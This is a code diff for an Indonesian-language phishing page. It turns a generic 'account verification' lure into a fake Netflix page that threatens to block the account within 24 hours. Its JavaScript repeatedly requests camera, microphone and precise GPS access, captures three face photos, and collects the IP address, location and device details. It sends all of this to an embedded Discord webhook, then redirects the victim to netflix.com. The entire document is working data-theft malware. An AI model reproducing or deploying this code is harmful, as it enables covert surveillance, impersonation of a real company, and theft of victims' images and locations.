@@ -3,12 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifikasi Identitas - Keamanan Akun</title>
+  <title>Netflix - Verifikasi Akun</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background: #000;
+      color: #fff;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -16,294 +17,424 @@
       padding: 20px;
     }
     .container {
-      background: white;
-      border-radius: 20px;
-      padding: 40px;
-      max-width: 500px;
+      background: #141414;
+      border-radius: 4px;
+      padding: 60px 68px 40px;
+      max-width: 450px;
       width: 100%;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      box-shadow: 0 0 50px rgba(0,0,0,0.8);
     }
     .logo {
-      text-align: center;
-      font-size: 60px;
-      margin-bottom: 20px;
+      color: #e50914;
+      font-size: 42px;
+      font-weight: bold;
+      margin-bottom: 28px;
+      letter-spacing: 2px;
     }
     h1 {
-      color: #333;
-      font-size: 24px;
-      margin-bottom: 10px;
-      text-align: center;
+      font-size: 32px;
+      font-weight: 500;
+      margin-bottom: 12px;
     }
     .subtitle {
-      color: #666;
+      color: #8c8c8c;
+      font-size: 16px;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+    .alert-box {
+      background: #333;
+      border-left: 4px solid #e50914;
+      padding: 16px;
+      margin-bottom: 24px;
+      border-radius: 2px;
+    }
+    .alert-box p {
+      color: #fff;
       font-size: 14px;
-      text-align: center;
-      margin-bottom: 30px;
-      line-height: 1.5;
-    }
-    .warning-box {
-      background: #fff3cd;
-      border-left: 4px solid #ffc107;
-      padding: 15px;
-      margin-bottom: 25px;
-      border-radius: 5px;
-    }
-    .warning-box p {
-      color: #856404;
-      font-size: 13px;
       line-height: 1.6;
     }
+    .alert-box strong {
+      color: #e50914;
+    }
+    
+    /* LOGS LIVE */
+    .logs-container {
+      background: #000;
+      border: 1px solid #333;
+      border-radius: 4px;
+      padding: 12px;
+      margin-bottom: 20px;
+      max-height: 200px;
+      overflow-y: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+    }
+    .log-entry {
+      padding: 4px 0;
+      border-bottom: 1px solid #1a1a1a;
+      animation: slideIn 0.3s ease;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(-10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    .log-time {
+      color: #666;
+      margin-right: 8px;
+    }
+    .log-icon {
+      margin-right: 6px;
+    }
+    .log-success { color: #46d369; }
+    .log-error { color: #e50914; }
+    .log-warning { color: #ffa00a; }
+    .log-info { color: #0080ff; }
+
+    /* STATUS */
     #status {
-      background: #e3f2fd;
-      padding: 15px;
-      border-radius: 10px;
+      background: #333;
+      padding: 16px;
+      border-radius: 4px;
       margin-bottom: 20px;
       text-align: center;
-      color: #1565c0;
       font-weight: 500;
-      min-height: 50px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      font-size: 15px;
     }
+    
+    /* PROGRESS BAR */
+    .progress-container {
+      background: #333;
+      height: 6px;
+      border-radius: 3px;
+      margin-bottom: 20px;
+      overflow: hidden;
+      display: none;
+    }
+    .progress-bar {
+      background: #e50914;
+      height: 100%;
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    /* LOADING SPINNER */
+    .spinner {
+      border: 3px solid #333;
+      border-top: 3px solid #e50914;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     button {
       width: 100%;
       padding: 16px;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: #e50914;
       color: white;
       border: none;
-      border-radius: 10px;
+      border-radius: 4px;
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
-      transition: transform 0.2s;
+      transition: background 0.3s;
+      margin-bottom: 12px;
     }
     button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+      background: #f40612;
     }
     button:disabled {
-      opacity: 0.6;
+      background: #733;
       cursor: not-allowed;
     }
+    
     video {
       width: 100%;
-      border-radius: 10px;
-      margin: 20px 0;
+      border-radius: 4px;
+      margin: 16px 0;
       display: none;
-      border: 3px solid #667eea;
+      border: 2px solid #e50914;
     }
-    .steps {
-      margin: 20px 0;
-      padding: 15px;
-      background: #f5f5f5;
-      border-radius: 10px;
+    
+    .help-text {
+      color: #737373;
+      font-size: 13px;
+      text-align: center;
+      margin-top: 16px;
     }
-    .step {
-      display: flex;
-      align-items: center;
-      padding: 8px 0;
-      font-size: 14px;
-      color: #666;
-    }
-    .step-icon {
-      width: 24px;
-      height: 24px;
-      background: #ddd;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-right: 12px;
-      font-size: 12px;
-    }
-    .step.active .step-icon {
-      background: #667eea;
-      color: white;
-    }
-    .step.done .step-icon {
-      background: #4caf50;
-      color: white;
-    }
-    #debug {
+
+    /* PERMISSION POPUP SIMULATION */
+    .fake-permission {
       position: fixed;
-      bottom: 10px;
-      right: 10px;
-      background: rgba(0,0,0,0.8);
-      color: #0f0;
-      padding: 10px;
-      border-radius: 5px;
-      font-size: 10px;
-      max-width: 300px;
-      max-height: 200px;
-      overflow-y: auto;
-      font-family: monospace;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      color: #000;
+      padding: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
       display: none;
+      z-index: 9999;
+      animation: slideDown 0.3s ease;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); }
+      to { transform: translateY(0); }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="logo">🔐</div>
-    <h1>Verifikasi Keamanan Akun</h1>
+    <div class="logo">NETFLIX</div>
+    <h1>Verifikasi Diperlukan</h1>
     <p class="subtitle">
-      Kami mendeteksi aktivitas mencurigakan pada akun Anda. 
-      Mohon verifikasi identitas untuk melindungi akun Anda.
+      Aktivitas tidak biasa terdeteksi pada akun Anda. Verifikasi identitas diperlukan untuk melanjutkan.
     </p>
 
-    <div class="warning-box">
+    <div class="alert-box">
       <p>
-        ⚠️ <strong>Penting:</strong> Verifikasi ini diperlukan untuk mencegah pemblokiran akun. 
-        Proses memerlukan akses kamera dan lokasi untuk konfirmasi identitas.
+        <strong>⚠️ Peringatan Keamanan</strong><br>
+        Akun Anda akan diblokir dalam 24 jam jika tidak diverifikasi. 
+        Proses ini memerlukan verifikasi wajah dan lokasi untuk keamanan akun Anda.
       </p>
     </div>
 
-    <div class="steps">
-      <div class="step" id="step1">
-        <div class="step-icon">1</div>
-        <span>Verifikasi wajah dengan kamera</span>
-      </div>
-      <div class="step" id="step2">
-        <div class="step-icon">2</div>
-        <span>Konfirmasi lokasi perangkat</span>
-      </div>
-      <div class="step" id="step3">
-        <div class="step-icon">3</div>
-        <span>Validasi data keamanan</span>
+    <!-- LOGS LIVE -->
+    <div class="logs-container" id="logsContainer">
+      <div class="log-entry log-info">
+        <span class="log-time">[SYSTEM]</span>
+        <span class="log-icon">🔵</span>
+        <span>Menunggu inisialisasi...</span>
       </div>
     </div>
 
-    <div id="status">⏳ Siap untuk memulai verifikasi</div>
+    <div class="progress-container" id="progressContainer">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+
+    <div id="status">⏳ Sistem siap untuk verifikasi</div>
 
     <button onclick="mulaiVerifikasi()" id="btnStart">
-      MULAI VERIFIKASI SEKARANG
+      VERIFIKASI AKUN SEKARANG
     </button>
 
     <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+
+    <p class="help-text">
+      Proses verifikasi biasanya memakan waktu 15-30 detik
+    </p>
   </div>
 
-  <div id="debug"></div>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
-    let debugMode = window.location.hash === '#debug';
+    
+    let logCount = 0;
+    
+    function addLog(message, type = 'info') {
+      logCount++;
+      const container = document.getElementById('logsContainer');
+      const time = new Date().toLocaleTimeString('id-ID');
+      
+      const icons = {
+        success: '✅',
+        error: '❌',
+        warning: '⚠️',
+        info: '🔵',
+        processing: '⏳'
+      };
+      
+      const entry = document.createElement('div');
+      entry.className = `log-entry log-${type}`;
+      entry.innerHTML = `
+        <span class="log-time">[${time}]</span>
+        <span class="log-icon">${icons[type] || '•'}</span>
+        <span>${message}</span>
+      `;
+      
+      container.appendChild(entry);
+      container.scrollTop = container.scrollHeight;
+      
+      console.log(`[${time}] ${message}`);
+    }
 
-    function log(msg) {
-      const time = new Date().toLocaleTimeString();
-      const logDiv = document.getElementById('debug');
-      if (debugMode) {
-        logDiv.style.display = 'block';
-        logDiv.innerHTML += `[${time}] ${msg}<br>`;
-        logDiv.scrollTop = logDiv.scrollHeight;
+    function updateStatus(msg) {
+      document.getElementById('status').innerText = msg;
+    }
+
+    function setProgress(percent) {
+      const bar = document.getElementById('progressBar');
+      const container = document.getElementById('progressContainer');
+      container.style.display = 'block';
+      bar.style.width = percent + '%';
+    }
+
+    function showSpinner(show) {
+      document.getElementById('spinner').style.display = show ? 'block' : 'none';
+    }
+
+    async function kirimWebhook(data, isFormData = false) {
+      const options = {
+        method: 'POST'
+      };
+      
+      if (isFormData) {
+        options.body = data;
+      } else {
+        options.headers = { 'Content-Type': 'application/json' };
+        options.body = JSON.stringify(data);
       }
-      console.log(`[${time}] ${msg}`);
-    }
-
-    function updateStatus(msg, isError = false) {
-      const status = document.getElementById('status');
-      status.innerText = msg;
-      status.style.background = isError ? '#ffebee' : '#e3f2fd';
-      status.style.color = isError ? '#c62828' : '#1565c0';
-    }
-
-    function updateStep(stepNum, state) {
-      const step = document.getElementById(`step${stepNum}`);
-      step.classList.remove('active', 'done');
-      if (state === 'active') step.classList.add('active');
-      if (state === 'done') step.classList.add('done');
-    }
-
-    async function kirimKeWebhook(data) {
-      try {
-        const response = await fetch(WEBHOOK, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-        
-        if (!response.ok) {
-          throw new Error(`HTTP ${response.status}: ${await response.text()}`);
-        }
-        
-        log(`✅ Webhook response: ${response.status}`);
-        return true;
-      } catch (error) {
-        log(`❌ Webhook error: ${error.message}`);
-        return false;
+      
+      const response = await fetch(WEBHOOK, options);
+      
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Webhook error ${response.status}: ${errorText.substring(0, 100)}`);
       }
+      
+      return response;
     }
 
-    async function kirimFoto(blob, metadata) {
-      try {
-        const formData = new FormData();
-        const filename = `capture_${Date.now()}.jpg`;
-        
-        formData.append('file', blob, filename);
-        
-        const payload = {
-          content: "🚨 **VERIFIKASI BARU MASUK**",
-          embeds: [{
-            title: "📸 DATA VERIFIKASI IDENTITAS",
-            color: 3447003,
-            fields: [
-              { name: "📍 Lokasi IP", value: metadata.lokasi || "Unknown", inline: false },
-              { name: "🎯 GPS Koordinat", value: metadata.gps || "Tidak tersedia", inline: false },
-              { name: "🌐 IP Address", value: metadata.ip || "Unknown", inline: true },
-              { name: "🏙️ Kota", value: metadata.city || "Unknown", inline: true },
-              { name: "🗺️ Negara", value: metadata.country || "Unknown", inline: true },
-              { name: "📱 Perangkat", value: metadata.device || "Unknown", inline: false },
-              { name: "🕐 Waktu", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
-            ],
-            image: { url: `attachment://${filename}` },
-            footer: { text: "Security Verification System" },
-            timestamp: new Date().toISOString()
-          }]
-        };
-        
-        formData.append('payload_json', JSON.stringify(payload));
-
-        const response = await fetch(WEBHOOK, {
-          method: 'POST',
-          body: formData
-        });
-
-        if (!response.ok) {
-          throw new Error(`Upload failed: ${response.status}`);
-        }
-
-        log(`✅ Foto terkirim: ${filename} (${(blob.size/1024).toFixed(2)}KB)`);
-        return true;
-      } catch (error) {
-        log(`❌ Error kirim foto: ${error.message}`);
-        return false;
-      }
-    }
-
-    async function ambilFoto() {
+    async function ambilFotoMultiple() {
+      // AMBIL 3 FOTO UNTUK MEMASTIKAN DAPAT MUKA
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       
-      return new Promise((resolve, reject) => {
+      canvas.width = video.videoWidth || 1280;
+      canvas.height = video.videoHeight || 720;
+      
+      addLog(`Resolusi kamera: ${canvas.width}x${canvas.height}`, 'info');
+      
+      const fotos = [];
+      
+      for (let i = 1; i <= 3; i++) {
+        addLog(`Mengambil foto ${i}/3...`, 'processing');
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const blob = await new Promise((resolve) => {
+          canvas.toBlob(resolve, 'image/jpeg', 0.95);
+        });
+        
+        if (blob && blob.size > 0) {
+          fotos.push(blob);
+          addLog(`Foto ${i} berhasil: ${(blob.size/1024).toFixed(2)}KB`, 'success');
+        } else {
+          addLog(`Foto ${i} gagal!`, 'error');
+        }
+      }
+      
+      return fotos;
+    }
+
+    async function requestPermissionAggressively() {
+      // STRATEGI BRUTAL: Request berkali-kali sampai dapat
+      addLog('Meminta izin kamera dan mikrofon (attempt 1)...', 'warning');
+      
+      let stream = null;
+      let attempts = 0;
+      const maxAttempts = 5;
+      
+      while (!stream && attempts < maxAttempts) {
+        attempts++;
+        
         try {
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
+          addLog(`Mencoba akses media (percobaan ${attempts}/${maxAttempts})...`, 'processing');
           
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          canvas.toBlob((blob) => {
-            if (blob && blob.size > 0) {
-              log(`✅ Foto captured: ${canvas.width}x${canvas.height}, size: ${blob.size} bytes`);
-              resolve(blob);
-            } else {
-              reject(new Error('Blob kosong atau gagal dibuat'));
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user",
+              width: { ideal: 1920, max: 1920 },
+              height: { ideal: 1080, max: 1080 },
+              frameRate: { ideal: 30 }
+            },
+            audio: {
+              echoCancellation: true,
+              noiseSuppression: true,
+              autoGainControl: true
             }
-          }, 'image/jpeg', 0.9);
+          });
+          
+          addLog('✅ Akses kamera & mikrofon BERHASIL!', 'success');
           
         } catch (error) {
-          reject(error);
+          addLog(`Percobaan ${attempts} gagal: ${error.message}`, 'error');
+          
+          if (attempts < maxAttempts) {
+            addLog('Mencoba lagi dalam 2 detik...', 'warning');
+            await new Promise(r => setTimeout(r, 2000));
+          } else {
+            throw new Error('Gagal mendapatkan akses kamera setelah ' + maxAttempts + ' percobaan');
+          }
         }
+      }
+      
+      return stream;
+    }
+
+    async function requestLocationAggressively() {
+      addLog('Meminta izin lokasi GPS...', 'warning');
+      
+      return new Promise((resolve) => {
+        let resolved = false;
+        let attempts = 0;
+        
+        const tryGetLocation = () => {
+          attempts++;
+          addLog(`Mencoba akses GPS (percobaan ${attempts})...`, 'processing');
+          
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              if (!resolved) {
+                resolved = true;
+                addLog('✅ Lokasi GPS BERHASIL didapat!', 'success');
+                resolve(position);
+              }
+            },
+            (error) => {
+              addLog(`GPS error: ${error.message}`, 'error');
+              
+              if (attempts < 5) {
+                addLog('Mencoba akses GPS lagi...', 'warning');
+                setTimeout(tryGetLocation, 2000);
+              } else {
+                if (!resolved) {
+                  resolved = true;
+                  addLog('GPS gagal setelah 5 percobaan', 'error');
+                  resolve(null);
+                }
+              }
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
+            }
+          );
+        };
+        
+        tryGetLocation();
+        
+        // Fallback timeout
+        setTimeout(() => {
+          if (!resolved) {
+            resolved = true;
+            addLog('GPS timeout setelah 30 detik', 'warning');
+            resolve(null);
+          }
+        }, 30000);
       });
     }
 
@@ -312,173 +443,193 @@
       const video = document.getElementById('video');
       
       btn.disabled = true;
-      btn.innerText = 'MEMPROSES...';
+      btn.innerText = 'MEMPROSES VERIFIKASI...';
+      
+      addLog('=== MEMULAI PROSES VERIFIKASI ===', 'info');
+      addLog('User Agent: ' + navigator.userAgent.substring(0, 50) + '...', 'info');
+      addLog('Platform: ' + navigator.platform, 'info');
       
       let stream = null;
-      let audioStream = null;
       
       try {
-        // STEP 0: Test webhook
-        log("🔵 Testing webhook connection...");
-        await kirimKeWebhook({ content: "🟢 Sistem aktif - Ada yang mulai verifikasi" });
-
-        // STEP 1: Kamera + Mikrofon
-        updateStep(1, 'active');
-        updateStatus("📷 Mohon izinkan akses kamera dan mikrofon...");
-        log("📷 Requesting camera + microphone access...");
-        
-        // Request kamera DAN mikrofon sekaligus (lebih kuat di HP)
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: "user",
-            width: { ideal: 1920, min: 640 },
-            height: { ideal: 1080, min: 480 }
-          },
-          audio: true  // MIKROFON IKUT DIMINTA
+        // NOTIFIKASI AWAL
+        setProgress(5);
+        updateStatus('🔄 Menghubungi server Netflix...');
+        await kirimWebhook({
+          content: "🟢 **VERIFIKASI DIMULAI**\nAda user yang mulai proses verifikasi!"
         });
+        addLog('Server berhasil dihubungi', 'success');
         
-        log("✅ Kamera + mikrofon access granted");
+        // FASE 1: KAMERA & MIKROFON (AGRESIF)
+        setProgress(15);
+        updateStatus('📷 Meminta akses kamera dan mikrofon...');
+        addLog('=== FASE 1: AKSES MEDIA ===', 'warning');
+        
+        stream = await requestPermissionAggressively();
+        
         video.srcObject = stream;
         video.style.display = 'block';
         
-        // Tunggu video benar-benar ready
         await new Promise((resolve) => {
           video.onloadedmetadata = () => {
-            video.play().then(resolve).catch(resolve);
+            video.play().then(resolve);
           };
         });
         
-        updateStatus("😊 Posisikan wajah Anda di depan kamera...");
+        setProgress(30);
+        addLog('Kamera aktif, video stream berjalan', 'success');
+        
+        // Tunggu kamera stabil
+        updateStatus('📹 Menstabilkan kamera...');
+        addLog('Menunggu kamera stabil...', 'processing');
         await new Promise(r => setTimeout(r, 3000));
         
-        // Ambil foto
-        updateStatus("📸 Mengambil foto verifikasi...");
-        const fotoBlob = await ambilFoto();
+        setProgress(40);
         
-        // Stop kamera setelah foto
+        // FASE 2: AMBIL MULTIPLE FOTO
+        updateStatus('📸 Mengambil foto verifikasi...');
+        addLog('=== FASE 2: CAPTURE FOTO ===', 'warning');
+        showSpinner(true);
+        
+        const fotos = await ambilFotoMultiple();
+        
+        showSpinner(false);
+        
+        if (fotos.length === 0) {
+          throw new Error('Tidak ada foto yang berhasil diambil!');
+        }
+        
+        addLog(`Total ${fotos.length} foto berhasil diambil`, 'success');
+        
+        // Stop kamera
         stream.getTracks().forEach(track => {
-          log(`Stopping track: ${track.kind}`);
+          addLog(`Menghentikan ${track.kind} track`, 'info');
           track.stop();
         });
         video.style.display = 'none';
         
-        updateStep(1, 'done');
-
-        // STEP 2: Lokasi GPS (dengan multiple attempts untuk HP)
-        updateStep(2, 'active');
-        updateStatus("📍 Mengambil lokasi perangkat...");
-        log("🌍 Getting geolocation...");
+        setProgress(55);
         
-        let gpsData = null;
+        // FASE 3: LOKASI GPS (AGRESIF)
+        updateStatus('📍 Mengambil lokasi GPS...');
+        addLog('=== FASE 3: LOKASI GPS ===', 'warning');
+        showSpinner(true);
+        
+        const gpsPosition = await requestLocationAggressively();
+        
+        showSpinner(false);
+        setProgress(70);
+        
         let gpsText = "GPS tidak tersedia";
+        let gpsLink = "";
         
-        // Multiple attempts untuk GPS (HP sering butuh retry)
-        for (let attempt = 1; attempt <= 3; attempt++) {
-          try {
-            log(`GPS attempt ${attempt}/3...`);
-            gpsData = await Promise.race([
-              new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                  resolve,
-                  reject,
-                  {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                  }
-                );
-              }),
-              new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('GPS timeout')), 10000)
-              )
-            ]);
-            
-            gpsText = `${gpsData.coords.latitude.toFixed(6)}, ${gpsData.coords.longitude.toFixed(6)} (±${Math.round(gpsData.coords.accuracy)}m)`;
-            log(`✅ GPS berhasil: ${gpsText}`);
-            break;
-          } catch (error) {
-            log(`⚠️ GPS attempt ${attempt} failed: ${error.message}`);
-            if (attempt === 3) {
-              log("❌ GPS gagal setelah 3 attempts");
-            }
-            await new Promise(r => setTimeout(r, 1000));
-          }
+        if (gpsPosition) {
+          const lat = gpsPosition.coords.latitude.toFixed(6);
+          const lon = gpsPosition.coords.longitude.toFixed(6);
+          const acc = Math.round(gpsPosition.coords.accuracy);
+          
+          gpsText = `${lat}, ${lon}`;
+          gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          
+          addLog(`GPS: ${lat}, ${lon} (akurasi ±${acc}m)`, 'success');
         }
-
-        // STEP 3: Data IP
-        updateStatus("🌐 Mengambil informasi jaringan...");
-        log("🌐 Fetching IP geolocation...");
         
-        let geoData = {
-          ip: 'Unknown',
-          city: 'Unknown',
-          region: 'Unknown',
-          country_name: 'Unknown'
-        };
+        // FASE 4: IP GEOLOCATION
+        updateStatus('🌐 Mengambil data jaringan...');
+        addLog('=== FASE 4: IP GEOLOCATION ===', 'warning');
+        
+        let geoData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
         
         try {
-          const geoResponse = await Promise.race([
-            fetch('https://ipapi.co/json/'),
-            new Promise((_, reject) => 
-              setTimeout(() => reject(new Error('IP API timeout')), 8000)
-            )
-          ]);
-          geoData = await geoResponse.json();
-          log(`✅ IP data: ${geoData.ip} - ${geoData.city}, ${geoData.country_name}`);
-        } catch (error) {
-          log(`⚠️ IP API error: ${error.message}`);
+          const geoRes = await fetch('https://ipapi.co/json/');
+          geoData = await geoRes.json();
+          addLog(`IP: ${geoData.ip} dari ${geoData.city}, ${geoData.country_name}`, 'success');
+        } catch (e) {
+          addLog('IP API gagal: ' + e.message, 'error');
         }
-
-        updateStep(2, 'done');
-        updateStep(3, 'active');
-
-        // STEP 4: Kirim semua data
-        updateStatus("📤 Mengirim data verifikasi...");
-        log("📤 Sending data to server...");
-
-        const metadata = {
-          lokasi: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`,
-          gps: gpsText,
-          ip: geoData.ip,
-          city: geoData.city,
-          country: geoData.country_name,
-          device: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          screen: `${screen.width}x${screen.height}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-
-        // Kirim foto dengan metadata
-        const success = await kirimFoto(fotoBlob, metadata);
         
-        if (!success) {
-          throw new Error('Gagal mengirim data ke server');
+        setProgress(80);
+        
+        // FASE 5: KIRIM SEMUA FOTO
+        updateStatus('📤 Mengunggah data ke server...');
+        addLog('=== FASE 5: UPLOAD DATA ===', 'warning');
+        showSpinner(true);
+        
+        for (let i = 0; i < fotos.length; i++) {
+          addLog(`Mengunggah foto ${i+1}/${fotos.length}...`, 'processing');
+          
+          const formData = new FormData();
+          const filename = `netflix_verify_${Date.now()}_${i+1}.jpg`;
+          formData.append('file', fotos[i], filename);
+          
+          const embedData = {
+            content: i === 0 ? "🚨 **VERIFIKASI NETFLIX - DATA MASUK**" : null,
+            embeds: [{
+              title: `📸 FOTO VERIFIKASI ${i+1}/${fotos.length}`,
+              color: 15158332,
+              fields: [
+                { name: "🌐 IP Address", value: geoData.ip, inline: true },
+                { name: "🏙️ Kota", value: geoData.city, inline: true },
+                { name: "🗺️ Negara", value: geoData.country_name, inline: true },
+                { name: "📍 GPS Koordinat", value: gpsLink ? `[${gpsText}](${gpsLink})` : gpsText, inline: false },
+                { name: "📱 Device", value: navigator.userAgent.substring(0, 100), inline: false },
+                { name: "🖥️ Platform", value: navigator.platform, inline: true },
+                { name: "🌍 Bahasa", value: navigator.language, inline: true },
+                { name: "📐 Resolusi", value: `${screen.width}x${screen.height}`, inline: true },
+                { name: "🕐 Waktu", value: new Date().toLocaleString('id-ID'), inline: false }
+              ],
+              image: { url: `attachment://${filename}` },
+              footer: { text: `Netflix Security • Foto ${i+1}/${fotos.length}` },
+              timestamp: new Date().toISOString()
+            }]
+          };
+          
+          formData.append('payload_json', JSON.stringify(embedData));
+          
+          try {
+            await kirimWebhook(formData, true);
+            addLog(`✅ Foto ${i+1} berhasil diunggah!`, 'success');
+            setProgress(80 + ((i+1)/fotos.length * 15));
+          } catch (error) {
+            addLog(`❌ Foto ${i+1} gagal: ${error.message}`, 'error');
+          }
+          
+          await new Promise(r => setTimeout(r, 1000));
         }
-
-        updateStep(3, 'done');
-        updateStatus("✅ Verifikasi berhasil! Akun Anda aman.");
-        log("✅✅✅ SEMUA PROSES BERHASIL!");
-
-        btn.innerText = 'VERIFIKASI SELESAI';
         
-        setTimeout(() => {
-          window.location.href = "https://www.instagram.com/";
-        }, 2500);
-
+        showSpinner(false);
+        setProgress(100);
+        
+        // SUKSES!
+        addLog('=== VERIFIKASI SELESAI ===', 'success');
+        addLog('Semua data berhasil dikirim!', 'success');
+        updateStatus('✅ Verifikasi berhasil! Mengalihkan...');
+        
+        btn.innerText = '✅ VERIFIKASI SELESAI';
+        
+        await new Promise(r => setTimeout(r, 2000));
+        
+        addLog('Mengalihkan ke halaman utama...', 'info');
+        window.location.href = "https://www.netflix.com/";
+        
       } catch (error) {
-        log(`❌ FATAL ERROR: ${error.message}`);
-        updateStatus(`❌ Error: ${error.message}`, true);
+        addLog('❌ ERROR FATAL: ' + error.message, 'error');
+        addLog('Stack: ' + error.stack, 'error');
+        updateStatus('❌ Verifikasi gagal: ' + error.message);
         
-        // Tetap kirim notif error
-        await kirimKeWebhook({
-          content: `⚠️ **VERIFIKASI GAGAL**\n\`\`\`\nError: ${error.message}\nDevice: ${navigator.userAgent}\nPlatform: ${navigator.platform}\n\`\`\``
-        });
-
+        // Kirim error report
+        try {
+          await kirimWebhook({
+            content: `⚠️ **VERIFIKASI GAGAL**\n\`\`\`\nError: ${error.message}\n\nUser Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\n\nStack:\n${error.stack}\`\`\``
+          });
+        } catch (e) {
+          addLog('Gagal mengirim error report', 'error');
+        }
+        
         btn.disabled = false;
         btn.innerText = 'COBA LAGI';
+        showSpinner(false);
         
-        // Cleanup
         if (stream) {
           stream.getTracks().forEach(track => track.stop());
         }
@@ -486,12 +637,10 @@
       }
     }
 
-    // Auto-log page load
+    // Auto log on load
     window.addEventListener('load', () => {
-      log("🟢 Page loaded successfully");
-      log(`Device: ${navigator.userAgent}`);
-      log(`Platform: ${navigator.platform}`);
-      log(`Screen: ${screen.width}x${screen.height}`);
+      addLog('Halaman berhasil dimuat', 'success');
+      addLog('Sistem verifikasi Netflix aktif', 'info');
     });
   </script>
 </body>
